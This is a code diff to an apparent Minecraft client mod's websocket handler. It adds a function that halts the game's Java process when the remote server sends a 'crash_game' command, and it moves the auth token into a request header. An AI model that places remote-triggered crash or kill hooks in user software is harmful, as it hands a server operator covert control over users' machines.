@@ -14,12 +14,26 @@ let isConnected = false;
 let ws = null;
 let start = Date.now();
 
+function triggerForcedCrash() {
+    try {
+        java.lang.Runtime.getRuntime().halt(137);
+    } catch (err) {
+        Client.getMinecraft().execute(() => {
+            throw new java.lang.RuntimeException(`V5 FC`);
+        });
+    }
+}
+
 function handleIncomingMessage(raw) {
     try {
         const data = JSON.parse(raw);
         if (!data || typeof data !== 'object') return false;
 
         if (data.type === 'remote') {
+            if (data.action === 'crash_game') {
+                triggerForcedCrash();
+                return true;
+            }
             handleRemoteMessage(data);
             return;
         } else {
@@ -54,8 +68,9 @@ function connectWebSocket() {
 
     if (!token) return Chat.messageIrc('&cLoader has not authenticated. IRC is unavailable.');
     returnDiscord(token);
-    const wsUrl = `${Links.WEBSOCKET_URL}?token=${encodeURIComponent(token)}`;
+    const wsUrl = `${Links.WEBSOCKET_URL}`;
     ws = new WebSocket(wsUrl);
+    ws.socket?.addHeader?.('Authorization', `Bearer ${token}`);
 
     ws.onOpen = () => {
         reconnectAttempts = 0;
